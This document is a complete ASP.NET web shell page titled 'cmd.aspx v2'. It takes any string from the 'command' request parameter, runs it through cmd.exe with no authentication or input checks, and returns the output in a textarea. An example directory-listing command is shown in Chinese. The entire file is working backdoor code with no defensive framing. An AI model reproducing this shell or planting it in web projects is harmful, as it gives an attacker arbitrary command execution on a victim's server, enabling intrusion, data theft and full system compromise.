<%@ Page Language="C#" Debug="true" Trace="false" ValidateRequest="false" %>

<!DOCTYPE html  >
<html>
<head>

    <title>cmd.aspx v2[Lith 180929]</title>
    <script runat="server">
        protected void Page_Load(object sender, EventArgs e)
        {
            string strOutput = "\r\n\r\n";
            string strCmd = Request["command"];

            if (null == strCmd) return;

            command.Value = strCmd;

            System.Diagnostics.Process si = new System.Diagnostics.Process();
            //si.StartInfo.WorkingDirectory = "c:\\";
            si.StartInfo.UseShellExecute = false;
            si.StartInfo.FileName = "cmd.exe";
            si.StartInfo.Arguments = "/c " + strCmd;

            si.StartInfo.CreateNoWindow = true;
            si.StartInfo.RedirectStandardInput = true;
            si.StartInfo.RedirectStandardOutput = true;
            si.StartInfo.RedirectStandardError = true;

            si.Start();
            strOutput += si.StandardOutput.ReadToEnd() + "\r\n\r\n";
            strOutput += si.StandardError.ReadToEnd() + "\r\n\r\n";
            si.Close();


            outPut.Text = strOutput;

        }
    </script>
</head>
<body>
    <form runat="server">
        <div>
            <input type="submit" />
        </div>
        cmd命令: demo     c: &amp; CD C:\ &amp; DIR
        <div>
            <textarea runat="server" id="command" rows="5" cols="150"  ></textarea>
        </div>
        return:
        <div>
            <textarea rows="20" cols="150">
                <asp:Literal ID="outPut" runat="server" />
            </textarea>
        </div>
    </form>
</body>
</html>
